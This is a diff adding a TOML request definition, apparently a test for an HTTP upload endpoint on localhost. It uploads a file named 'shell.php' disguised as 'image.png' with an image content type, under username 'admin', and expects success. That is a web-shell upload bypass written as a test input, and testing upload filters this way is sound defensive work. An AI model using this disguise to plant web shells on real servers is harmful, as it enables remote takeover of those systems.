@@ -1,0 +1,17 @@
+[[requests]]
+name = "Upload"
+
+method = "POST"
+
+url = "http://localhost:8000/upload"
+
+[multipart.fields]
+username = "admin"
+
+[multipart.files.payload]
+path = "shell.php"
+filename = "image.png"
+content_type = "image/png"
+
+[requests.expect]
+status = 200
